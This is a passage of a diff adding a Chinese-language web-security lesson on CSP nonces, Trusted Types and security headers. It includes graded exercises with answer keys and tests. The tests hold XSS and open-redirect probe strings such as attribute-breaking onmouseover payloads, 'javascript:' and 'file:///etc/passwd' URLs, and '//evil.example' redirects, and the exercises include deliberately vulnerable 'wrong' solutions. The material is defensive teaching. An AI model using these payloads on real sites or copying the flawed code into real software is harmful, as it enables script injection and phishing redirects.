+<p>nonce 的安全性完全來自「攻擊者猜不到這一次的值」，所以 web.dev 的規則是：用密碼學安全的亂數產生、128 bits 以上、base64 編碼、<strong>每個回應都新產生</strong>。寫死或所有回應共用，攻擊者打開一次自己的頁面就看到值，把它寫進注入的 <code>&lt;script nonce&gt;</code> 就能執行，等於沒有。下面的範例模擬兩個請求，執行後看兩次的 nonce 不同，而且同一個請求裡標頭和 script 標籤用的是同一個值：</p>
+<div class="lab"><script type="code">
+function newNonce(): string {
+  const bytes = crypto.getRandomValues(new Uint8Array(16))  // 128 bits
+  let binary = ''
+  for (const b of bytes) binary += String.fromCharCode(b)
+  return btoa(binary)
+}
+
+// 每個請求：產生 nonce → 放進標頭 → 放進同一個回應 HTML 的每個 script 標籤
+for (const path of ['/menu', '/orders']) {
+  const nonce = newNonce()
+  console.log(path)
+  console.log(`  Content-Security-Policy: script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`)
+  console.log(`  <script nonce="${nonce}" src="/assets/app.js"><\/script>`)
+}
+</script></div>
+
+<h3>為什麼不用網域允許清單？</h3>
+<p>你可能看過另一種 CSP：<code>script-src 'self' https://cdn.jsdelivr.net</code>，意思是「自己的網域和這個 CDN 的腳本可以執行」。它看起來更直覺，但信任的單位是「整個網域上的所有檔案」。jsdelivr 上有整個 npm 的所有套件，任何人都能發布套件，也有很多舊版函式庫能被利用，例如舊版 AngularJS 會執行頁面上的模板語法、JSONP 端點會執行網址指定的回呼函式。攻擊者注入 <code>&lt;script src="https://cdn.jsdelivr.net/npm/攻擊者的套件"&gt;</code>，完全符合你的清單。web.dev 引用的研究指出，網域允許清單型的 CSP 在大多數設定下都能被繞過。nonce 型不管網域，只認這次回應的那個值。</p>
+<p>也不要加 <code>'unsafe-inline'</code>：它允許所有 inline 腳本與事件屬性，正好就是 XSS 注入的東西，加了它，那則評論的 <code>onerror</code> 就能執行。（有一種舊瀏覽器相容的寫法會同時加它，見課末。）</p>
+
+<h3>怎麼上線才不會擋掉自己的功能？</h3>
+<p>政策寫好了，但直接上線，可能擋掉你沒注意到的 inline 腳本或第三方工具，正式環境的某個按鈕就默默失效。所以先改送 <code>Content-Security-Policy-Report-Only</code> 標頭：瀏覽器照政策檢查，但只回報違規（印在 console、送到設定的回報端點），不阻擋。觀察一段時間、修好誤擋的地方，再換成正式的 <code>Content-Security-Policy</code>。CSP 也可以寫在 <code>&lt;meta http-equiv&gt;</code> 裡，但限制較多，正式環境用標頭，細節見課末。</p>
+
+<h3>咖啡店的 Vite SPA 怎麼帶 nonce？</h3>
+<p>咖啡店前台是 Vite 打包的 Vue SPA，這裡有一個矛盾：nonce 要伺服器每次回應時產生，但 Vite 打包出來的 <code>index.html</code> 是一個靜態檔案。解法是讓 Vite 先在 HTML 裡留好位置，再由送出 <code>index.html</code> 的那一層填值：設定 Vite 的 <code>html.cspNonce</code> 放一個佔位字串，Vite 會把它加到產生的 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code>、<code>&lt;link&gt;</code> 上；回應 <code>index.html</code> 的那一層（Node 伺服器、Nginx）每個請求把佔位字串換成新的 nonce，並送出對應的標頭。代價是 <code>index.html</code> 不能直接交給 CDN 快取同一份，因為每個回應的內容都不同。</p>
+<p>如果 <code>index.html</code> 一定要完全靜態、交給 CDN 快取，另一條路是用 hash 取代 nonce，做法和代價見課末。</p>
+
+<h3>NestJS 後端怎麼送出這些標頭？</h3>
+<p>NestJS、Express 通常用 <a href="https://helmetjs.github.io/">helmet</a> 一次加上 CSP 和其他安全標頭（<a href="21-nestjs-auth.html">第 21 課</a>與<a href="26-capstone.html">期末專題</a>會用）。要注意 helmet 8.3.0 預設的 CSP 是 <code>script-src 'self'</code> 這類網域清單型，還有 <code>style-src 'self' https: 'unsafe-inline'</code>：比沒有好，但不是這一節的嚴格 CSP。要用 nonce，就自己設定 <code>script-src</code>。helmet 加上的其他標頭各擋什麼，整理在課末的查表。</p>
+
+<div class="callout practice"><strong>💡 實務上：CSP 最常卡在第三方腳本與行銷工具</strong><br>導入 CSP 時，最常被擋的不是自己的程式，而是行銷透過 Google Tag Manager 加的追蹤碼、客服聊天外掛、A/B 測試工具：它們常在頁面插入沒有 nonce 的 inline 腳本或 <code>onclick</code> 這類事件屬性，嚴格 CSP 會直接擋掉（由已放行的腳本用程式載入的檔案，<code>'strict-dynamic'</code> 會放行，通常不是問題）。所以上線前要先列出頁面上所有第三方腳本，並跟行銷、PM 講好「新加工具要先經過工程確認」，不然某天加了一段碼，在正式環境卻默默沒作用。Report-Only 的回報裡會有不少瀏覽器擴充功能造成的雜訊，看報告時先過濾掉，專注在自己網域的頁面與腳本。回報端點要限制大小和頻率，不要讓它變成可以灌爆的公開 API。</div>
+
+<p>CSP 擋的是「執行」這一步。但第一節的 DOM 型 XSS，源頭是前端程式把字串塞進 <code>innerHTML</code>，能不能在寫程式這一端就擋住？</p>
+
+<h2>能不能讓危險注入點根本收不到字串？Trusted Types</h2>
+<p>第一節說過，找 XSS 要從危險注入點往回追每一個值的來源。專案一大，<code>innerHTML</code> 散在幾十個地方，每一處都要追，審查很難做完。<strong>Trusted Types</strong> 換了一個方向：讓瀏覽器拒絕把普通字串直接塞進危險注入點，只接受經過你定義的 <strong>policy</strong> 產生的物件。policy 是一個你命名的轉換函式，例如「把輸入交給 DOMPurify 清理再回傳」；只有它產生的值，瀏覽器才認為可以塞進 <code>innerHTML</code>。它一樣用 CSP 指令開啟：</p>
+<pre>Content-Security-Policy: require-trusted-types-for 'script'; trusted-types review-html</pre>
+<pre>// 開啟之後
+el.innerHTML = review.text            // TypeError：字串不能直接塞進 innerHTML
+
+// 必須經過 policy；trusted-types 指令列出允許建立的 policy 名稱
+const policy = trustedTypes.createPolicy('review-html', {
+  createHTML: (input) => DOMPurify.sanitize(input),
+})
+el.innerHTML = policy.createHTML(review.text)   // 可以</pre>
+<p>好處是審查的範圍變小：整個專案只有建立 policy 的那幾行能產生可以塞進 <code>innerHTML</code> 的值，搜尋 <code>createPolicy</code> 就找得到全部。它涵蓋 <code>innerHTML</code>、<code>outerHTML</code>、<code>insertAdjacentHTML</code>、<code>document.write</code>、<code>eval</code>、<code>new Function</code>、<code>script.src</code> 等。</p>
+<p>不支援的瀏覽器會忽略這個指令（各瀏覽器的支援版本見課末），所以它跟 CSP 一樣是額外一層，不能取代清理。現有專案可以先用 Report-Only 開啟，看哪些地方還在塞字串。到這裡，咖啡店對那則評論有了三層防護：輸出時編碼或清理、CSP 拒絕執行、Trusted Types 讓注入點收不到字串。</p>
+
+<h2>補充與查表</h2>
+<p>主線用不到、但上線設定或審查別人的實作時會用到的細節。</p>
+
+<h3>其他安全標頭（查表用，不用背）</h3>
+<p>helmet 一次加上的標頭裡，除了 CSP，這幾個各擋一類問題：</p>
+<div class="table-wrap">
+<table>
+  <tr><th>標頭</th><th>擋什麼</th><th>建議值</th></tr>
+  <tr><td><code>X-Content-Type-Options</code></td><td>瀏覽器自己猜內容類型，把 JSON 或上傳的檔案當 HTML／腳本執行</td><td><code>nosniff</code></td></tr>
+  <tr><td>CSP 的 <code>frame-ancestors</code></td><td><strong>點擊劫持</strong>（clickjacking）：別的網站把你的頁面放進透明 iframe，騙使用者點到「確認付款」。這個指令決定誰可以把你的頁面嵌進 iframe；舊的做法是 <code>X-Frame-Options</code></td><td><code>frame-ancestors 'none'</code>（不讓任何網站嵌入）或 <code>'self'</code></td></tr>
+  <tr><td><code>Referrer-Policy</code></td><td>點連結離開時，完整網址（可能含 token、訂單編號）經 <code>Referer</code> 標頭送到別的網站</td><td><code>strict-origin-when-cross-origin</code>（現代瀏覽器的預設）；重設密碼頁用 <code>no-referrer</code>（<a href="16-account-flows.html">第 16 課</a>）</td></tr>
+  <tr><td><code>Strict-Transport-Security</code></td><td>使用者打 http:// 時第一個請求被竊聽或竄改（<a href="../../devops/lessons/05-tls.html">部署課第 5 課</a>）</td><td><code>max-age=31536000; includeSubDomains</code></td></tr>
+</table>
+</div>
+
+<h3>用 hash 取代 nonce</h3>
+<p><code>script-src 'sha256-…' 'strict-dynamic'</code>，用 inline 腳本內容的 SHA-256 取代 nonce，HTML 可以完全靜態、可以快取。hash 認的是 inline 腳本，Vite 產生的是外部的 <code>&lt;script src&gt;</code>，所以要改成一小段 inline 載入程式（用 <code>createElement('script')</code> 載入打包檔，靠 <code>'strict-dynamic'</code> 放行），再算這一段的 hash。web.dev 建議靜態或要快取的頁面用 hash、伺服器渲染的頁面用 nonce。代價：腳本內容改一個空白，hash 就要重算，要放進建置流程。</p>
+
+<h3>'unsafe-inline' 當舊瀏覽器的退路</h3>
+<p>web.dev 提到可以把 <code>'unsafe-inline'</code> 當成給很舊的瀏覽器的退路，支援 nonce 的瀏覽器看到 nonce 時會忽略它；但這會讓讀設定的人誤會，咖啡店不需要支援那麼舊的瀏覽器，就不要加。</p>
+
+<h3>Report-Only 與 meta 標籤</h3>
+<p>Report-Only 只能用 HTTP 標頭，<code>&lt;meta http-equiv&gt;</code> 不支援；正式環境也建議用標頭而不是 meta。</p>
+
+<h3>Trusted Types 的支援度</h3>
+<p>caniuse，2026-10-31：Chrome／Edge 83、Firefox 148（145～147 預設關閉）、Safari 26.0 起。</p>
+
+<h2>練習</h2>
+
+<div class="exercise">
+  <p>練習 1：寫 <code>escapeHtml(s)</code>，把五個字元換掉：<code>&amp;</code> → <code>&amp;amp;</code>、<code>&lt;</code> → <code>&amp;lt;</code>、<code>&gt;</code> → <code>&amp;gt;</code>、<code>"</code> → <code>&amp;quot;</code>、<code>'</code> → <code>&amp;#39;</code>。再寫 <code>renderReview(review)</code>，產生 <code>&lt;li data-author="作者"&gt;內容&lt;/li&gt;</code>：作者放在屬性裡、內容放在元素裡，兩個都要編碼。</p>
+  <script type="start">
+function escapeHtml(s: string): string {
+  throw new Error('TODO')
+}
+
+function renderReview(review: { author: string; text: string }): string {
+  throw new Error('TODO')
+}
+
+console.log(renderReview({ author: '王小明', text: '拿鐵很好喝 <3' }))
+console.log(renderReview({ author: '" onmouseover="alert(1)', text: '<script>alert(1)<\/script>' }))
+</script>
+  <script type="answer">
+function escapeHtml(s: string): string {
+  return s
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+}
+
+function renderReview(review: { author: string; text: string }): string {
+  return `<li data-author="${escapeHtml(review.author)}">${escapeHtml(review.text)}</li>`
+}
+
+console.log(renderReview({ author: '王小明', text: '拿鐵很好喝 <3' }))
+console.log(renderReview({ author: '" onmouseover="alert(1)', text: '<script>alert(1)<\/script>' }))
+</script>
+  <script type="types">
+type _1 = Expect<Equal<typeof escapeHtml, (s: string) => string>>  // escapeHtml 接收 string、回傳 string
+type _2 = Expect<Equal<typeof renderReview, (review: { author: string; text: string }) => string>>  // renderReview 的簽章不要改
+</script>
+  <script type="tests">
+assert.equal(escapeHtml('<script>alert(1)<\/script>'), '&lt;script&gt;alert(1)&lt;/script&gt;', '< 與 > 要換成 &lt; &gt;')
+assert.equal(escapeHtml('<<b>>'), '&lt;&lt;b&gt;&gt;', '每一個 < > 都要換，不是只換第一個：replace 要用 /…/g')
+assert.equal(escapeHtml('拿鐵 & 可頌'), '拿鐵 &amp; 可頌', '& 要換成 &amp;，中文原樣保留')
+assert.equal(escapeHtml('&lt;'), '&amp;lt;', '已經是 &lt; 的文字要變成 &amp;lt;，畫面上才會顯示 &lt; 這四個字')
+assert.equal(escapeHtml('<'), '&lt;', '一個 < 只能變成 &lt;，不能變成 &amp;lt;：& 要最先換')
+assert.equal(escapeHtml(`"'"'`), '&quot;&#39;&quot;&#39;', '雙引號換成 &quot;、單引號換成 &#39;，每一個都要換')
+assert.equal(escapeHtml('美式咖啡 80 元'), '美式咖啡 80 元', '沒有特殊字元時原樣回傳')
+assert.equal(
+  renderReview({ author: '王小明', text: '拿鐵很好喝 <3' }),
+  '<li data-author="王小明">拿鐵很好喝 &lt;3</li>',
+  '格式是 <li data-author="作者">內容</li>',
+)
+const attack = renderReview({ author: '" onmouseover="alert(1)', text: '<img src=x onerror=alert(1)>' })
+assert.equal(
+  attack,
+  '<li data-author="&quot; onmouseover=&quot;alert(1)">&lt;img src=x onerror=alert(1)&gt;</li>',
+  '作者（屬性）與內容（元素）都要編碼',
+)
+assert(!/<img|<script/i.test(attack), '輸出不能有未編碼的 <img 或 <script')
+assert.equal(attack.split('"').length, 3, '屬性裡的雙引號要編碼，整段輸出只能剩包住屬性值的那兩個 "')
+assert.equal(
+  renderReview({ author: "林志豪' onfocus='alert(1)", text: '可頌' }),
+  '<li data-author="林志豪&#39; onfocus=&#39;alert(1)">可頌</li>',
+  '單引號也要編碼：有人會把屬性改成用單引號包',
+)
+</script>
+  <script type="wrong">
+// & 最後才換：前面產生的 &lt; 會被變成 &amp;lt;
+function escapeHtml(s: string): string {
+  return s
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+    .replace(/&/g, '&amp;')
+}
+
+function renderReview(review: { author: string; text: string }): string {
+  return `<li data-author="${escapeHtml(review.author)}">${escapeHtml(review.text)}</li>`
+}
+</script>
+  <script type="wrong">
+// 沒有處理引號：屬性可以被跳出
+function escapeHtml(s: string): string {
+  return s
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+}
+
+function renderReview(review: { author: string; text: string }): string {
+  return `<li data-author="${escapeHtml(review.author)}">${escapeHtml(review.text)}</li>`
+}
+</script>
+  <script type="wrong">
+// replace 用字串當第一個參數：只換第一個
+function escapeHtml(s: string): string {
+  return s
+    .replace('&', '&amp;')
+    .replace('<', '&lt;')
+    .replace('>', '&gt;')
+    .replace('"', '&quot;')
+    .replace("'", '&#39;')
+}
+
+function renderReview(review: { author: string; text: string }): string {
+  return `<li data-author="${escapeHtml(review.author)}">${escapeHtml(review.text)}</li>`
+}
+</script>
+  <script type="wrong">
+// 只編碼內容，忘了屬性
+function escapeHtml(s: string): string {
+  return s
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+}
+
+function renderReview(review: { author: string; text: string }): string {
+  return `<li data-author="${review.author}">${escapeHtml(review.text)}</li>`
+}
+</script>
+  <script type="wrong">
+// 「已經是實體的 & 就不換」：&lt; 原樣留下，畫面上顯示成 <，不是使用者輸入的那四個字
+function escapeHtml(s: string): string {
+  return s
+    .replace(/&(?!#?\w+;)/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+}
+
+function renderReview(review: { author: string; text: string }): string {
+  return `<li data-author="${escapeHtml(review.author)}">${escapeHtml(review.text)}</li>`
+}
+</script>
+  <script type="wrong">
+// 把危險字元刪掉（過濾）而不是編碼
+function escapeHtml(s: string): string {
+  return s.replace(/[<>"']/g, '')
+}
+
+function renderReview(review: { author: string; text: string }): string {
+  return `<li data-author="${escapeHtml(review.author)}">${escapeHtml(review.text)}</li>`
+}
+</script>
+</div>
+
+<div class="exercise">
+  <p>練習 2：寫 <code>safeLinkUrl(input)</code>：顧客在個人頁填的網站，要顯示成 <code>&lt;a href&gt;</code>。用 <code>new URL(input)</code> 解析（不給 base，所以相對網址會解析失敗），只允許 <code>protocol</code> 是 <code>http:</code> 或 <code>https:</code>，回傳解析後的 <code>url.href</code>；解析失敗或其他協定回 <code>null</code>。再寫 <code>safeRedirect(next, appOrigin)</code>：登入後要導回的位置只能在自己的網站裡。用 <code>new URL(next, appOrigin)</code> 解析，<code>origin</code> 等於 <code>appOrigin</code> 時回傳 <code>pathname + search + hash</code>；origin 不同、解析失敗、或結果以 <code>//</code> 開頭時回 <code>'/'</code>。</p>
+  <script type="start">
+function safeLinkUrl(input: string): string | null {
+  throw new Error('TODO')
+}
+
+function safeRedirect(next: string, appOrigin: string): string {
+  throw new Error('TODO')
+}
+
+console.log(safeLinkUrl('https://coffee.example/menu'), safeLinkUrl('javascript:alert(1)'))
+console.log(safeRedirect('/orders/42', 'https://shop.coffee.example'), safeRedirect('//evil.example', 'https://shop.coffee.example'))
+</script>
+  <script type="answer">
+function safeLinkUrl(input: string): string | null {
+  let url: URL
+  try {
+    url = new URL(input)
+  } catch {
+    return null
+  }
+  return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null
+}
+
+function safeRedirect(next: string, appOrigin: string): string {
+  let url: URL
+  try {
+    url = new URL(next, appOrigin)
+  } catch {
+    return '/'
+  }
+  if (url.origin !== appOrigin) return '/'
+  const target = url.pathname + url.search + url.hash
+  return target.startsWith('//') ? '/' : target
+}
+
+console.log(safeLinkUrl('https://coffee.example/menu'), safeLinkUrl('javascript:alert(1)'))
+console.log(safeRedirect('/orders/42', 'https://shop.coffee.example'), safeRedirect('//evil.example', 'https://shop.coffee.example'))
+</script>
+  <script type="types">
+type _1 = Expect<Equal<typeof safeLinkUrl, (input: string) => string | null>>  // safeLinkUrl 回傳 string | null
+type _2 = Expect<Equal<typeof safeRedirect, (next: string, appOrigin: string) => string>>  // safeRedirect 一定回傳 string（不安全時回 '/'）
+</script>
+  <script type="tests">
+for (const bad of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', '  javascript:alert(1)', 'java\tscript:alert(1)', 'data:text/html,<script>alert(1)<\/script>', 'vbscript:msgbox(1)', 'file:///etc/passwd']) {
+  assert.equal(safeLinkUrl(bad), null, `${JSON.stringify(bad)} 要回 null：只允許 http: 和 https:，而且要看 new URL 解析後的 protocol`)
+}
+for (const bad of ['//evil.example', '/menu', 'coffee.example', '']) {
+  assert.equal(safeLinkUrl(bad), null, `${JSON.stringify(bad)} 不是完整網址，new URL 沒有 base 會解析失敗，要回 null`)
+}
+assert.equal(safeLinkUrl('https://coffee.example/menu'), 'https://coffee.example/menu', '合法的 https 網址要回傳')
+assert.equal(safeLinkUrl('http://coffee.example'), 'http://coffee.example/', 'http 也允許，回傳 url.href（會補上結尾的 /）')
+assert.equal(safeLinkUrl('HTTPS://Coffee.Example/menu'), 'https://coffee.example/menu', '回傳解析後正規化的 url.href，不是原始字串')
+assert.equal(safeLinkUrl('  https://coffee.example/a'), 'https://coffee.example/a', '開頭的空白由 URL 解析器去掉，回傳 url.href')
+const idn = 'https://咖啡.tw/菜單'
+assert.equal(safeLinkUrl(idn), new URL(idn).href, '中文網域的網址要回傳正規化後的 url.href')
+
+const app = 'https://shop.coffee.example'
+assert.equal(safeRedirect('/orders/42?tab=items#top', app), '/orders/42?tab=items#top', '自己網站的路徑原樣回傳（含 query 與 hash）')
+assert.equal(safeRedirect('https://shop.coffee.example/cart', app), '/cart', '自己來源的完整網址只回傳路徑')
+for (const bad of ['//evil.example', '//evil.example/login', '/\\evil.example', 'https://evil.example', 'javascript:alert(1)', 'https://shop.coffee.example.evil.example/steal', 'http://shop.coffee.example/cart', 'https://shop.coffee.example:8443/cart', '/\t/evil.example', 'https://evil.example/?r=https://shop.coffee.example', 'https://[bad']) {
+  assert.equal(safeRedirect(bad, app), '/', `${JSON.stringify(bad)} 要回 '/'：用 new URL(next, appOrigin) 解析後比對 origin（協定＋主機＋port）完全相等`)
+}
+for (const bad of ['/.//evil.example', 'https://shop.coffee.example//evil.example', '/x/..//evil.example']) {
+  assert.equal(safeRedirect(bad, app), '/', `${JSON.stringify(bad)} 解析後的路徑是 //evil.example，當成導向位置會跳到別的網站，要回 '/'`)
+}
+assert.equal(safeRedirect('/menu', 'https://kiosk.coffee.example'), '/menu', 'appOrigin 是參數，不要寫死')
+assert.equal(safeRedirect('https://shop.coffee.example/menu', 'https://kiosk.coffee.example'), '/', 'appOrigin 換了之後，shop.coffee.example 就是別的來源')
+</script>
+  <script type="wrong">
+// 用正規表示式檢查原始字串：空白、tab 可以繞過
+function safeLinkUrl(input: string): string | null {
+  return /^javascript:/i.test(input) ? null : input
+}
+
+function safeRedirect(next: string, appOrigin: string): string {
+  let url: URL
+  try {
+    url = new URL(next, appOrigin)
+  } catch {
+    return '/'
+  }
+  if (url.origin !== appOrigin) return '/'
+  const target = url.pathname + url.search + url.hash
+  return target.startsWith('//') ? '/' : target
+}
+</script>
+  <script type="wrong">
+// 黑名單只擋 javascript:，data: 通過
+function safeLinkUrl(input: string): string | null {
+  let url: URL
+  try {
+    url = new URL(input)
+  } catch {
+    return null
+  }
+  return url.protocol === 'javascript:' ? null : url.href
+}
+
+function safeRedirect(next: string, appOrigin: string): string {
+  let url: URL
+  try {
+    url = new URL(next, appOrigin)
+  } catch {
+    return '/'
+  }
+  if (url.origin !== appOrigin) return '/'
+  const target = url.pathname + url.search + url.hash
+  return target.startsWith('//') ? '/' : target
+}
+</script>
+  <script type="wrong">
+// startsWith('http') 檢查原始字串
+function safeLinkUrl(input: string): string | null {
+  return input.startsWith('http://') || input.startsWith('https://') ? input : null
+}
+
+function safeRedirect(next: string, appOrigin: string): string {
+  let url: URL
+  try {
+    url = new URL(next, appOrigin)
+  } catch {
+    return '/'
+  }
+  if (url.origin !== appOrigin) return '/'
+  const target = url.pathname + url.search + url.hash
+  return target.startsWith('//') ? '/' : target
+}
+</script>
+  <script type="wrong">
+// safeRedirect 只檢查開頭是 /
+function safeLinkUrl(input: string): string | null {
+  let url: URL
+  try {
+    url = new URL(input)
+  } catch {
+    return null
+  }
+  return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null
+}
+
+function safeRedirect(next: string, appOrigin: string): string {
+  return next.startsWith('/') ? next : '/'
+}
+</script>
+  <script type="wrong">
+// safeRedirect 用 startsWith(appOrigin) 判斷完整網址
+function safeLinkUrl(input: string): string | null {
+  let url: URL
+  try {
+    url = new URL(input)
+  } catch {
+    return null
+  }
+  return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null
+}
+
+function safeRedirect(next: string, appOrigin: string): string {
+  if (next.startsWith(appOrigin)) {
+    const url = new URL(next)
+    return url.pathname + url.search + url.hash
+  }
+  return next.startsWith('/') && !next.startsWith('//') && !next.startsWith('/\\') ? next : '/'
+}
+</script>
+  <script type="wrong">
+// safeRedirect 用 includes(appOrigin) 判斷
+function safeLinkUrl(input: string): string | null {
+  let url: URL
+  try {
+    url = new URL(input)
+  } catch {
+    return null
+  }
+  return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null
+}
+
+function safeRedirect(next: string, appOrigin: string): string {
+  if (!next.includes(appOrigin) && !next.startsWith('/')) return '/'
+  let url: URL
+  try {
+    url = new URL(next, appOrigin)
+  } catch {
+    return '/'
+  }
+  const target = url.pathname + url.search + url.hash
+  return target.startsWith('//') ? '/' : target
+}
+</script>
+  <script type="wrong">
+// safeRedirect 只比對 hostname：協定、port 不同也放行
+function safeLinkUrl(input: string): string | null {
+  let url: URL
+  try {
+    url = new URL(input)
+  } catch {
+    return null
+  }
+  return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null
+}
+
+function safeRedirect(next: string, appOrigin: string): string {
+  let url: URL
+  try {
+    url = new URL(next, appOrigin)
+  } catch {
+    return '/'
+  }
+  if (url.hostname !== new URL(appOrigin).hostname) return '/'
+  const target = url.pathname + url.search + url.hash
+  return target.startsWith('//') ? '/' : target
+}
+</script>
+  <script type="wrong">
+// 比對了 origin，但沒擋 // 開頭的路徑
+function safeLinkUrl(input: string): string | null {
+  let url: URL
+  try {
+    url = new URL(input)
+  } catch {
+    return null
+  }
+  return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null
+}
+
+function safeRedirect(next: string, appOrigin: string): string {
+  let url: URL
+  try {
+    url = new URL(next, appOrigin)
+  } catch {
+    return '/'
+  }
+  return url.origin === appOrigin ? url.pathname + url.search + url.hash : '/'
+}
+</script>
+</div>
+
+<div class="exercise">
+  <p>練習 3：寫 <code>newNonce()</code>：用 CSPRNG 產生 16 bytes（128 bits），回傳標準 base64（有 <code>+ / =</code> 的那種，CSP 的 nonce 用標準 base64）。再寫 <code>cspHeader(nonce, opts)</code>，回傳 <code>[標頭名稱, 標頭值]</code>：值必須是 <code>script-src 'nonce-&lt;nonce&gt;' 'strict-dynamic'; object-src 'none'; base-uri 'none'</code>，<code>opts.reportOnly</code> 為 true 時標頭名稱是 <code>Content-Security-Policy-Report-Only</code>，否則是 <code>Content-Security-Policy</code>。</p>
+  <script type="start">
+function newNonce(): string {
+  throw new Error('TODO')
+}
+
+function cspHeader(nonce: string, opts: { reportOnly: boolean }): [name: string, value: string] {
+  throw new Error('TODO')
+}
+
+const nonce = newNonce()
+console.log(nonce)
+console.log(cspHeader(nonce, { reportOnly: true }))
+</script>
+  <script type="answer">
+function newNonce(): string {
+  const bytes = crypto.getRandomValues(new Uint8Array(16))
+  let binary = ''
+  for (const b of bytes) binary += String.fromCharCode(b)
+  return btoa(binary)
+}
+
+function cspHeader(nonce: string, opts: { reportOnly: boolean }): [name: string, value: string] {
+  const name = opts.reportOnly ? 'Content-Security-Policy-Report-Only' : 'Content-Security-Policy'
+  const value = [`script-src 'nonce-${nonce}' 'strict-dynamic'`, `object-src 'none'`, `base-uri 'none'`].join('; ')
+  return [name, value]
+}
+
+const nonce = newNonce()
+console.log(nonce)
+console.log(cspHeader(nonce, { reportOnly: true }))
+</script>
+  <script type="types">
+type _1 = Expect<Equal<typeof newNonce, () => string>>  // newNonce 不接收參數、回傳 string
+type _2 = Expect<Equal<ReturnType<typeof cspHeader>, [string, string]>>  // cspHeader 回傳 [標頭名稱, 標頭值]
+</script>
+  <script type="tests">
+const n1 = newNonce()
+const n2 = newNonce()
+assert(/^[A-Za-z0-9+/]{22}==$/.test(n1), '16 bytes 的標準 base64 是 22 個字元加上 ==：' + n1)
+assert.equal(atob(n1).length, 16, 'nonce 解碼後要剛好 16 bytes')
+assert(n1 !== n2, '每次呼叫 newNonce 都要不同：nonce 每個回應都要新產生')
+assert.equal(new Set(Array.from({ length: 200 }, () => newNonce())).size, 200, '產生 200 個 nonce 不能有重複')
+const originalRandom = Math.random
+Math.random = () => 0.5
+try {
+  assert.equal(new Set(Array.from({ length: 50 }, () => newNonce())).size, 50, '把 Math.random 固定之後仍然要每個都不同：要用 crypto.getRandomValues')
+} finally {
+  Math.random = originalRandom
+}
+
+const realGetRandomValues = crypto.getRandomValues
+let filled = 0
+Object.defineProperty(crypto, 'getRandomValues', {
+  configurable: true,
+  value: (arr: ArrayBufferView) => {
+    const view = new Uint8Array(arr.buffer, arr.byteOffset, arr.byteLength)
+    view.forEach((_, i) => { view[i] = i })
+    filled += view.length
+    return arr
+  },
+})
+let stubbed: string
+try {
+  stubbed = newNonce()
+} finally {
+  delete (crypto as { getRandomValues?: unknown }).getRandomValues
+}
+assert(crypto.getRandomValues === realGetRandomValues, '（測試自己的檢查）getRandomValues 要還原')
+assert.equal(filled, 16, 'newNonce 要呼叫 crypto.getRandomValues 填滿剛好 16 bytes')
+assert.equal(stubbed, 'AAECAwQFBgcICQoLDA0ODw==', 'nonce 要直接是 getRandomValues 填好的 16 bytes 做標準 base64，不要再加工或只用一部分')
+
+const nonce = 'AAECAwQFBgcICQoLDA0ODw=='
+const [name, value] = cspHeader(nonce, { reportOnly: false })
+assert.equal(name, 'Content-Security-Policy', 'reportOnly: false 時標頭名稱是 Content-Security-Policy')
+assert.equal(cspHeader(nonce, { reportOnly: true })[0], 'Content-Security-Policy-Report-Only', 'reportOnly: true 時標頭名稱是 Content-Security-Policy-Report-Only')
+const directives = new Map(value.split(';').map(d => d.trim()).filter(Boolean).map(d => {
+  const [k, ...v] = d.split(/\s+/)
+  return [k, v] as const
+}))
+const scriptSrc = directives.get('script-src') ?? []
+assert(scriptSrc.includes(`'nonce-${nonce}'`), `script-src 要有 'nonce-<傳進來的 nonce>'（前後加單引號）`)
+assert(scriptSrc.includes(`'strict-dynamic'`), `script-src 要有 'strict-dynamic'`)
+assert(!scriptSrc.includes(`'unsafe-inline'`) && !scriptSrc.includes(`'unsafe-eval'`), `script-src 不能有 'unsafe-inline' 或 'unsafe-eval'`)
+assert(!scriptSrc.some(s => !s.startsWith(`'`)), 'script-src 不能有網域允許清單（例如 https://cdn.jsdelivr.net）')
+assert.deepEqual(directives.get('object-src'), [`'none'`], `要有 object-src 'none'`)
+assert.deepEqual(directives.get('base-uri'), [`'none'`], `要有 base-uri 'none'，不然注入的 <base> 能劫持相對路徑的腳本`)
+assert.equal(value, `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`, '標頭值要跟題目寫的完全一樣')
+assert(cspHeader('xyz', { reportOnly: false })[1].includes(`'nonce-xyz'`), 'cspHeader 要用傳進來的 nonce，不要自己產生或寫死')
+</script>
+  <script type="wrong">
+// 寫死的 nonce
+function newNonce(): string {
+  return 'AAECAwQFBgcICQoLDA0ODw=='
+}
+
+function cspHeader(nonce: string, opts: { reportOnly: boolean }): [name: string, value: string] {
+  const name = opts.reportOnly ? 'Content-Security-Policy-Report-Only' : 'Content-Security-Policy'
+  return [name, `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`]
+}
+</script>
+  <script type="wrong">
+// 用 Math.random 產生 nonce
+function newNonce(): string {
+  let binary = ''
+  for (let i = 0; i < 16; i++) binary += String.fromCharCode(Math.floor(Math.random() * 256))
+  return btoa(binary)
+}
+
+function cspHeader(nonce: string, opts: { reportOnly: boolean }): [name: string, value: string] {
+  const name = opts.reportOnly ? 'Content-Security-Policy-Report-Only' : 'Content-Security-Policy'
+  return [name, `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`]
+}
+</script>
+  <script type="wrong">
